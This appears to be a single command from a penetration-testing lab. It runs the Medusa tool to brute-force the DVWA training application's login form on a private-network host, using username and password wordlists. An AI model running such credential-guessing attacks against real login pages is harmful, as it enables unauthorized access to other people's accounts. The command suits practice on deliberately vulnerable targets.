medusa -h 192.168.56.101 -U login.txt -P pass.txt -M http \
-m PAGE:'dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
